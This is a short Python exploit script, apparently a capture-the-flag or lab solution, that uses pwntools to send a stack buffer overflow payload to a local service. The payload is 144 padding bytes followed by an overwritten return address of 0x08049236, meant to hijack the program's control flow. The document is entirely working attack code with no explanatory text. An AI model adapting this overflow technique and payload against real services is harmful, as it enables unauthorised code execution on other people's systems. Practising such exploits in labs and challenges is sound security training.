from pwn import *


address = ("127.0.0.1", 43588)

payload = b"a" * 144 + b"\x36\x92\x04\x08"

conn = remote(address[0], address[1])
conn.sendline(payload)
print(conn.recvall())
